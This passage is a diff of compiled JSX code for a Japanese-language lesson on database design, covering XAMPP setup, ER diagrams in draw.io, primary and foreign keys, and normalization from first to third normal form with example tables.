-鈴木一郎が受講をやめてデータを削除すると、その行からしかわからないPHP基礎コースの情報も失われる`,e.jsx("br",{}),`
-`,e.jsx("strong",{children:"リスク："})," 必要な情報まで一緒に削除される"]})})]})})]}),`
-`,e.jsxs(n,{summary:"正規化の段階と実装",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"正規化の3段階："})}),e.jsx(i,{children:`
-graph TD
-  A["非正規化テーブル<br/>(全データが1つのテーブル)"] --> B["第1正規形 (1NF)<br/>各セルには1つの値のみ"]
-  B --> C["第2正規形 (2NF)<br/>部分関数従属性を排除"]
-  C --> D["第3正規形 (3NF)<br/>推移関数従属性を排除"]
-  
-  style A fill:#fef2f2
-  style B fill:#fef3c7
-  style C fill:#ecfdf5
-  style D fill:#dcfce7
-`}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"分かりやすい正規化の説明："})}),e.jsx(l,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-start p-3 bg-blue-50 rounded border border-blue-200",children:[e.jsx("div",{className:"w-6 h-6 text-blue-600 mr-3 mt-0.5",children:e.jsx("div",{className:"text-lg font-bold",children:"1"})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"第1正規形（1NF）"}),e.jsxs("div",{className:"text-sm text-slate-600",children:["各マス（セル）には",e.jsx("strong",{children:"1つの情報だけ"}),"を入れよう！"]})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-green-50 rounded border border-green-200",children:[e.jsx("div",{className:"w-6 h-6 text-green-600 mr-3 mt-0.5",children:e.jsx("div",{className:"text-lg font-bold",children:"2"})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"第2正規形（2NF）"}),e.jsxs("div",{className:"text-sm text-slate-600",children:[e.jsx("strong",{children:"情報ごとにテーブルを分けよう！"}),"（部分関数従属性の排除）"]})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-orange-50 rounded border border-orange-200",children:[e.jsx("div",{className:"w-6 h-6 text-orange-600 mr-3 mt-0.5",children:e.jsx("div",{className:"text-lg font-bold",children:"3"})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"第3正規形（3NF）"}),e.jsxs("div",{className:"text-sm text-slate-600",children:["情報が他の情報に",e.jsx("strong",{children:"間接的に依存しないようにしよう！"})]})]})]})]})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"正規化後のテーブル設計："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-sql",children:`-- 学生テーブル
-CREATE TABLE students (
-    id INT PRIMARY KEY AUTO_INCREMENT,
-    name VARCHAR(64) NOT NULL,
-    email VARCHAR(256) UNIQUE NOT NULL,
-    phone VARCHAR(32)
-);
+`,e.jsxs(n,{summary:"授業前準備",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"1. XAMPP起動"})}),e.jsxs(s.ul,{children:[`
+`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"Windows"}),": Apache と MySQL が緑色になっていればOK"]}),`
+`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"Mac"}),': MySQL Database と Apache Web Server が "Running" になっていればOK']}),`
+`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"2. ファイル配置"})}),e.jsxs(s.ul,{children:[`
+`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"Windows"}),": ",e.jsx(s.code,{children:"C:/XAMPP/htdocs/php04/"})]}),`
+`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"Mac"}),": ",e.jsx(s.code,{children:"/Applications/XAMPP/htdocs/php04/"})]}),`
+`]})]}),`
+`,e.jsx(s.h2,{children:"draw.io（diagrams.net）の準備"}),`
+`,e.jsxs(n,{summary:"draw.ioとは",children:[e.jsxs(s.ul,{children:[`
+`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"draw.io"}),"（diagrams.net）は、無料で使える多機能なダイアグラム作成ツール"]}),`
+`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"作成できる図の種類："})}),e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"フローチャート"}),`
+`,e.jsx(s.li,{children:"プロセス図"}),`
+`,e.jsx(s.li,{children:"組織図"}),`
+`,e.jsx(s.li,{children:"UML図"}),`
+`,e.jsx(s.li,{children:e.jsx(s.strong,{children:"ER図（エンティティ・リレーションシップ図）"})}),`
+`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"利用方法："})}),e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"Webベースで利用可能"}),`
+`,e.jsx(s.li,{children:"デスクトップアプリケーション"}),`
+`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"Visual Studio Code の拡張機能"}),"（今回はこれを使用）"]}),`
+`]})]}),`
+`,e.jsx(n,{summary:"主なER図作成サービスとその比較",children:e.jsx(l,{children:e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{className:"p-4 bg-blue-50 rounded border border-blue-200",children:[e.jsx("div",{className:"font-medium text-blue-800 mb-2",children:"draw.io / diagrams.net"}),e.jsx("div",{className:"text-sm text-blue-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"利点:"})," 無料でアクセスしやすく、直感的な操作が可能。豊富なテンプレートとクラウド統合機能",e.jsx("br",{}),`
+`,e.jsx("strong",{children:"欠点:"})," 専門的なデータモデリング機能には限りがある"]})})]}),e.jsxs("div",{className:"p-4 bg-green-50 rounded border border-green-200",children:[e.jsx("div",{className:"font-medium text-green-800 mb-2",children:"Lucidchart"}),e.jsx("div",{className:"text-sm text-green-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"利点:"})," 直感的なインターフェースと豊富な機能。リアルタイムでの共同編集",e.jsx("br",{}),`
+`,e.jsx("strong",{children:"欠点:"})," 無料版には機能制限があり、フル機能には有料プランが必要"]})})]}),e.jsxs("div",{className:"p-4 bg-orange-50 rounded border border-orange-200",children:[e.jsx("div",{className:"font-medium text-orange-800 mb-2",children:"Microsoft Visio"}),e.jsx("div",{className:"text-sm text-orange-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"利点:"})," 複雑な図の作成に対応し、業界標準のツールとしての信頼性が高い",e.jsx("br",{}),`
+`,e.jsx("strong",{children:"欠点:"})," Microsoft製品との統合に重点"]})})]})]})})}),`
+`,e.jsxs(n,{summary:"VSCodeへの拡張機能のインストール",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"1. VSCode拡張機能マーケットプレイスにアクセス"})}),e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"VSCodeの拡張機能タブから「Draw.io Integration」を検索してインストール"}),`
+`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"2. 新しいER図の作成"})}),e.jsxs(s.ul,{children:[`
+`,e.jsxs(s.li,{children:["VSCodeで新しいファイルを作成し、ファイルの拡張子を ",e.jsx(s.code,{children:".drawio"})," または ",e.jsx(s.code,{children:".dio"})," に設定"]}),`
+`]}),e.jsx(s.pre,{children:e.jsx(s.code,{children:`例: database-design.drawio
+`})}),e.jsx(s.p,{children:"ファイルを保存すると、draw.ioのエディタが自動的に開く"}),e.jsx(r,{type:"tip",title:"テーマカラーの変更",children:e.jsx(s.p,{children:"画面右下の「Theme: XXX」を押下することで色を変更することができます。お好みのテーマを選択してください。"})})]}),`
+`,e.jsx(s.h2,{children:"データモデリングの基礎"}),`
+`,e.jsxs(n,{summary:"データモデリングの必要性",children:[e.jsx(s.p,{children:"データモデリングを行う理由は..."}),e.jsx(l,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-blue-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"データ整合性の確保"}),e.jsx("div",{className:"text-sm text-slate-600",children:"データ間の正確な関係を定義し、データの一貫性と正確性を保証する"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-green-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M13 10V3L4 14h7v7l9-11h-7z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"効率的なデータアクセス"}),e.jsx("div",{className:"text-sm text-slate-600",children:"適切に構造化されたデータモデルを通じて、データの検索、更新、削除が効率的に実施"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-purple-600 mr-3 mt-0.5",children:e.jsxs("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:[e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M15 12a3 3 0 11-6 0 3 3 0 016 0z"}),e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"})]})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"複雑なデータ関係の可視化"}),e.jsx("div",{className:"text-sm text-slate-600",children:"ER図などのデータモデリングツールを使用して、複雑なデータの関係性を明確に理解し、可視化"})]})]})]})})]}),`
+`,e.jsxs(n,{summary:"エンティティとは",children:[e.jsxs(s.ul,{children:[`
+`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"エンティティ"}),"はデータベースで管理される情報の単位"]}),`
+`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"例：学校のデータベースの場合のエンティティ"})}),e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"「生徒」「先生」「授業」...など"}),`
+`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"各エンティティは属性を持つ："})}),e.jsx(l,{children:e.jsxs("div",{className:"p-4 bg-blue-50 rounded border border-blue-200",children:[e.jsx("div",{className:"font-medium text-blue-800 mb-3",children:"「生徒」エンティティの属性例"}),e.jsxs("div",{className:"grid grid-cols-3 gap-2",children:[e.jsx("div",{className:"p-2 bg-white rounded border border-blue-100 text-center text-sm",children:"名前"}),e.jsx("div",{className:"p-2 bg-white rounded border border-blue-100 text-center text-sm",children:"学年"}),e.jsx("div",{className:"p-2 bg-white rounded border border-blue-100 text-center text-sm",children:"クラス"}),e.jsx("div",{className:"p-2 bg-white rounded border border-blue-100 text-center text-sm",children:"学籍番号"}),e.jsx("div",{className:"p-2 bg-white rounded border border-blue-100 text-center text-sm",children:"生年月日"}),e.jsx("div",{className:"p-2 bg-white rounded border border-blue-100 text-center text-sm",children:"..."})]})]})}),e.jsx(r,{type:"tip",title:"ポイント",children:e.jsx(s.p,{children:"エンティティは「テーブル」として実装され、属性は「カラム（列）」として実装されます。"})})]}),`
+`,e.jsxs(n,{summary:"リレーションシップとは",children:[e.jsxs(s.ul,{children:[`
+`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"リレーションシップ"}),"はエンティティ間の関連性を示す"]}),`
+`]}),e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"例："})," 「生徒」は「授業」に「参加する」というリレーションシップがある"]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"リレーションシップの種類"})}),e.jsx(l,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-start p-3 bg-blue-50 rounded border border-blue-200",children:[e.jsx("div",{className:"w-6 h-6 text-blue-600 mr-3 mt-0.5",children:e.jsx("div",{className:"text-lg font-bold",children:"1:1"})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"一対一（One-to-One）"}),e.jsx("div",{className:"text-sm text-slate-600",children:"1つのレコードが別のテーブルの1つのレコードとだけ関連"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-green-50 rounded border border-green-200",children:[e.jsx("div",{className:"w-6 h-6 text-green-600 mr-3 mt-0.5",children:e.jsx("div",{className:"text-lg font-bold",children:"1:N"})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"一対多（One-to-Many）"}),e.jsx("div",{className:"text-sm text-slate-600",children:"1つのレコードが別のテーブルの複数レコードと関連"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-orange-50 rounded border border-orange-200",children:[e.jsx("div",{className:"w-6 h-6 text-orange-600 mr-3 mt-0.5",children:e.jsx("div",{className:"text-lg font-bold",children:"N:M"})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"多対多（Many-to-Many）"}),e.jsx("div",{className:"text-sm text-slate-600",children:"複数のレコードが別のテーブルの複数レコードと関連"})]})]})]})})]}),`
+`,e.jsxs(n,{summary:"キーの概念（プライマリキー・外部キー）",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"プライマリキー（主キー / PK）"})}),e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"各エンティティ内のレコードを一意に識別するためのキー"}),`
+`,e.jsx(s.li,{children:"値の重複や変更が許容されない"}),`
+`]}),e.jsx(i,{children:`
+erDiagram
+  students {
+      int id PK "プライマリキー"
+      varchar name
+  }
+`}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"外部キー（FK）"})}),e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"異なるエンティティ間のリレーションシップを表現するためのキー"}),`
+`,e.jsx(s.li,{children:"他のテーブルのプライマリキーを参照する"}),`
+`]}),e.jsx(i,{children:`
+erDiagram
+  courses {
+      int id PK "プライマリキー"
+      varchar name
+      int instructor_id FK "外部キー"
+  }
 
--- 講師テーブル
-CREATE TABLE instructors (
-    id INT PRIMARY KEY AUTO_INCREMENT,
-    name VARCHAR(64) NOT NULL,
-    email VARCHAR(256) UNIQUE NOT NULL
-);
+  instructors {
+      int id PK "プライマリキー"
+      varchar name
+  }
 
--- コーステーブル
-CREATE TABLE courses (
-    id INT PRIMARY KEY AUTO_INCREMENT,
-    name VARCHAR(64) NOT NULL,
-    instructor_id INT NOT NULL,
-    fee INT NOT NULL,
-    FOREIGN KEY (instructor_id) REFERENCES instructors(id)
-);
-
--- 受講テーブル（学生とコースの関連）
-CREATE TABLE enrollments (
-    id INT PRIMARY KEY AUTO_INCREMENT,
-    student_id INT NOT NULL,
-    course_id INT NOT NULL,
-    enrollment_date DATE NOT NULL,
-    FOREIGN KEY (student_id) REFERENCES students(id),
-    FOREIGN KEY (course_id) REFERENCES courses(id)
-);
-`})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"ER図での関係性表現："})}),e.jsx(i,{children:`
+  courses }o--|| instructors : "担当"
+`}),e.jsxs(s.ul,{children:[`
+`,e.jsxs(s.li,{children:[e.jsx(s.code,{children:"courses.instructor_id"}),"（外部キー）が ",e.jsx(s.code,{children:"instructors.id"}),"（プライマリキー）を参照"]}),`
+`,e.jsx(s.li,{children:"これにより「どのコースをどの講師が担当しているか」を表現"}),`
+`]})]}),`
+`,e.jsxs(n,{summary:"ER図とは",children:[e.jsxs(s.ul,{children:[`
+`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"ER図"}),"（Entity Relationship Diagram）は、エンティティ・リレーションシップ図のこと"]}),`
+`,e.jsx(s.li,{children:"エンティティ間の関連性やキーの概念を視覚的に表現した図"}),`
+`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"ER図の構成要素"})}),e.jsx(l,{children:e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4",children:[e.jsxs("div",{className:"p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"font-medium text-slate-800 mb-2",children:"エンティティ"}),e.jsx("div",{className:"text-sm text-slate-600",children:"四角形で表され、エンティティ名が記載される"})]}),e.jsxs("div",{className:"p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"font-medium text-slate-800 mb-2",children:"リレーションシップ"}),e.jsx("div",{className:"text-sm text-slate-600",children:"線でエンティティ間を結び、関連性の種類を示す"})]}),e.jsxs("div",{className:"p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"font-medium text-slate-800 mb-2",children:"属性"}),e.jsx("div",{className:"text-sm text-slate-600",children:"エンティティに紐づく情報（カラム）"})]}),e.jsxs("div",{className:"p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"font-medium text-slate-800 mb-2",children:"キー"}),e.jsx("div",{className:"text-sm text-slate-600",children:"PK（主キー）、FK（外部キー）を明示する"})]})]})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"ER図の例：授業と生徒の管理システム"})}),e.jsx(i,{children:`
 erDiagram
   students {
       int id PK
       varchar name
-      varchar email
-      varchar phone
+      int grade
+      varchar class
   }
 
-  instructors {
+  teachers {
       int id PK
       varchar name
-      varchar email
+      varchar subject
   }
 
-  courses {
+  classes {
       int id PK
-      varchar name
-      int instructor_id FK
-      int fee
+      varchar class_name
+      int teacher_id FK
   }
 
   enrollments {
       int id PK
       int student_id FK
-      int course_id FK
+      int class_id FK
       date enrollment_date
   }
 
   students ||--o{ enrollments : "受講"
+  classes ||--o{ enrollments : "開講"
+  teachers ||--o{ classes : "担当"
+`})]}),`
+`,e.jsx(s.h2,{children:"ER図作成演習"}),`
+`,e.jsxs(n,{summary:"draw.ioでのER図作図手順",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"1. ER図の要素追加"})}),e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"左側メニューの「その他の要素」を押下し、「ソフトウェア > ER」にチェックを入れて「適用」を押下"}),`
+`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"2. エンティティの作図"})}),e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"必要な形状をクリックし、ドラッグ&ドロップでキャンバスに配置"}),`
+`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"3. エンティティの編集"})}),e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"形状をダブルクリックしてテキストを編集"}),`
+`,e.jsx(s.li,{children:"フィールドを追加したい場合は、挿入したいフィールドを選択後、「フォーマット > 配置 > テーブル」内にあるアイコンを押下"}),`
+`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"4. リレーションの作図"})}),e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"エンティティを未選択状態でカーソルを乗せると青い矢印が表示される"}),`
+`,e.jsx(s.li,{children:"エンティティ間をドラッグして線を引く"}),`
+`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"5. リレーションの編集"})}),e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"リレーションを選択状態にすると「フォーマット > スタイル」より編集が可能"}),`
+`]}),e.jsx(r,{type:"tip",title:"よく使うアイコン",children:e.jsx(s.p,{children:"下段アイコンの「線の形状」「始点の形状」「終点の形状」をよく使います。リレーションの種類（1:1、1:N、N:M）に応じて適切な形状を選択しましょう。"})})]}),`
+`,e.jsx(s.h2,{children:"正規化"}),`
+`,e.jsxs(n,{summary:"正規化とは",children:[e.jsx(r,{type:"info",title:"正規化の本質",children:e.jsxs(s.p,{children:["正規化とは、",e.jsx(s.strong,{children:"データの重複を排除し、データの整合性を保つ"}),"ためのデータベース設計手法です。"]})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"正規化のポイント："})}),e.jsx(l,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-blue-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"1つの情報は1箇所に"}),e.jsx("div",{className:"text-sm text-slate-600",children:"同じ情報を複数箇所に持たせない"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-green-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7c0-2.21-3.582-4-8-4s-8 1.79-8 4z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"目的ごとにテーブルを分ける"}),e.jsx("div",{className:"text-sm text-slate-600",children:"学生情報、コース情報、受講情報...など"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-purple-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"テーブル同士を関連付ける"}),e.jsx("div",{className:"text-sm text-slate-600",children:"外部キーでテーブル間の関係を表現"})]})]})]})}),e.jsx(r,{type:"tip",title:"正規化 → 複数テーブルの連携へ",children:e.jsxs(s.p,{children:["正規化によってデータを複数のテーブルに分割するため、",e.jsx(s.strong,{children:"関連するデータを取得するにはテーブル同士を連携（JOIN）する必要があります"}),"。JOINの詳細は後半で学びます。"]})})]}),`
+`,e.jsxs(n,{summary:"正規化のプロセス",children:[e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"正規化は段階的に行われ、各段階でより適切なデータ設計になる"}),`
+`]}),e.jsx(i,{children:`
+graph LR
+  A["非正規形"] --> B["第1正規形<br/>(1NF)"]
+  B --> C["第2正規形<br/>(2NF)"]
+  C --> D["第3正規形<br/>(3NF)"]
+  
+  style A fill:#fef2f2
+  style B fill:#fef3c7
+  style C fill:#ecfdf5
+  style D fill:#dcfce7
+`}),e.jsx(r,{type:"tip",title:"実務での正規化",children:e.jsx(s.p,{children:"一般的なWebアプリケーション開発では、第3正規形（3NF）まで正規化すれば十分です。それ以上の正規化（BCNF、4NF、5NF）は特殊なケースでのみ必要になります。"})})]}),`
+`,e.jsxs(n,{summary:"第1正規化（1NF）の詳細",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"説明："}),`
+テーブル内の各カラムに原子値（これ以上分割できない値）のみが含まれ、各カラムの値が一意のデータ型を持つこと。`]}),e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"噛み砕いた説明："}),`
+各マス（セル）には `,e.jsx(s.strong,{children:"1つの情報だけ"})," を入れる。リストや複数の値を1つのマスに入れない。"]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"例："})}),e.jsx(l,{children:e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{className:"p-4 bg-red-50 rounded border border-red-200",children:[e.jsx("div",{className:"font-medium text-red-800 mb-2",children:"非正規化（NG）"}),e.jsx("div",{className:"overflow-x-auto",children:e.jsxs("table",{className:"text-sm w-full",children:[e.jsx("thead",{children:e.jsxs("tr",{className:"bg-red-100",children:[e.jsx("th",{className:"p-2 border",children:"生徒名"}),e.jsx("th",{className:"p-2 border",children:"クラブ活動"})]})}),e.jsxs("tbody",{children:[e.jsxs("tr",{children:[e.jsx("td",{className:"p-2 border",children:"田中太郎"}),e.jsx("td",{className:"p-2 border text-red-600",children:"サッカー部, テニス部"})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"p-2 border",children:"佐藤花子"}),e.jsx("td",{className:"p-2 border text-red-600",children:"吹奏楽部, 美術部, 文芸部"})]})]})]})}),e.jsx("div",{className:"text-xs text-red-600 mt-2",children:"問題: 1つのセルに複数の値が入っている"})]}),e.jsxs("div",{className:"p-4 bg-green-50 rounded border border-green-200",children:[e.jsx("div",{className:"font-medium text-green-800 mb-2",children:"第1正規形（OK）"}),e.jsx("div",{className:"overflow-x-auto",children:e.jsxs("table",{className:"text-sm w-full",children:[e.jsx("thead",{children:e.jsxs("tr",{className:"bg-green-100",children:[e.jsx("th",{className:"p-2 border",children:"生徒名"}),e.jsx("th",{className:"p-2 border",children:"クラブ活動"})]})}),e.jsxs("tbody",{children:[e.jsxs("tr",{children:[e.jsx("td",{className:"p-2 border",children:"田中太郎"}),e.jsx("td",{className:"p-2 border",children:"サッカー部"})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"p-2 border",children:"田中太郎"}),e.jsx("td",{className:"p-2 border",children:"テニス部"})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"p-2 border",children:"佐藤花子"}),e.jsx("td",{className:"p-2 border",children:"吹奏楽部"})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"p-2 border",children:"佐藤花子"}),e.jsx("td",{className:"p-2 border",children:"美術部"})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"p-2 border",children:"佐藤花子"}),e.jsx("td",{className:"p-2 border",children:"文芸部"})]})]})]})}),e.jsx("div",{className:"text-xs text-green-600 mt-2",children:"改善: 各セルに1つの値のみ"})]})]})})]}),`
+`,e.jsxs(n,{summary:"第2正規化（2NF）の詳細",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"説明："}),`
+1NFを満たし、全ての非キーカラムがプライマリキー全体に完全に依存している（部分的依存がない）こと。`]}),e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"噛み砕いた説明："}),`
+テーブルが複数の情報を混在させず、`,e.jsx(s.strong,{children:"情報ごとにテーブルを分ける"}),"。"]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"例："})}),e.jsx(l,{children:e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{className:"p-4 bg-red-50 rounded border border-red-200",children:[e.jsx("div",{className:"font-medium text-red-800 mb-2",children:"非2NF（NG）"}),e.jsx("div",{className:"overflow-x-auto",children:e.jsxs("table",{className:"text-sm w-full",children:[e.jsx("thead",{children:e.jsxs("tr",{className:"bg-red-100",children:[e.jsx("th",{className:"p-2 border",children:"学生ID"}),e.jsx("th",{className:"p-2 border",children:"科目ID"}),e.jsx("th",{className:"p-2 border",children:"科目名"}),e.jsx("th",{className:"p-2 border",children:"成績"})]})}),e.jsxs("tbody",{children:[e.jsxs("tr",{children:[e.jsx("td",{className:"p-2 border",children:"S001"}),e.jsx("td",{className:"p-2 border",children:"C001"}),e.jsx("td",{className:"p-2 border text-red-600",children:"数学"}),e.jsx("td",{className:"p-2 border",children:"85"})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"p-2 border",children:"S001"}),e.jsx("td",{className:"p-2 border",children:"C002"}),e.jsx("td",{className:"p-2 border text-red-600",children:"英語"}),e.jsx("td",{className:"p-2 border",children:"90"})]})]})]})}),e.jsx("div",{className:"text-xs text-red-600 mt-2",children:"問題: 科目名は科目IDにのみ依存（部分依存）"})]}),e.jsxs("div",{className:"p-4 bg-green-50 rounded border border-green-200",children:[e.jsx("div",{className:"font-medium text-green-800 mb-2",children:"第2正規形（OK）- テーブルを分割"}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4",children:[e.jsxs("div",{children:[e.jsx("div",{className:"text-xs font-medium mb-1",children:"成績テーブル"}),e.jsxs("table",{className:"text-sm w-full",children:[e.jsx("thead",{children:e.jsxs("tr",{className:"bg-green-100",children:[e.jsx("th",{className:"p-1 border text-xs",children:"学生ID"}),e.jsx("th",{className:"p-1 border text-xs",children:"科目ID"}),e.jsx("th",{className:"p-1 border text-xs",children:"成績"})]})}),e.jsxs("tbody",{children:[e.jsxs("tr",{children:[e.jsx("td",{className:"p-1 border text-xs",children:"S001"}),e.jsx("td",{className:"p-1 border text-xs",children:"C001"}),e.jsx("td",{className:"p-1 border text-xs",children:"85"})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"p-1 border text-xs",children:"S001"}),e.jsx("td",{className:"p-1 border text-xs",children:"C002"}),e.jsx("td",{className:"p-1 border text-xs",children:"90"})]})]})]})]}),e.jsxs("div",{children:[e.jsx("div",{className:"text-xs font-medium mb-1",children:"科目テーブル"}),e.jsxs("table",{className:"text-sm w-full",children:[e.jsx("thead",{children:e.jsxs("tr",{className:"bg-green-100",children:[e.jsx("th",{className:"p-1 border text-xs",children:"科目ID"}),e.jsx("th",{className:"p-1 border text-xs",children:"科目名"})]})}),e.jsxs("tbody",{children:[e.jsxs("tr",{children:[e.jsx("td",{className:"p-1 border text-xs",children:"C001"}),e.jsx("td",{className:"p-1 border text-xs",children:"数学"})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"p-1 border text-xs",children:"C002"}),e.jsx("td",{className:"p-1 border text-xs",children:"英語"})]})]})]})]})]})]})]})})]}),`
+`,e.jsxs(n,{summary:"第3正規化（3NF）の詳細",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"説明："}),`
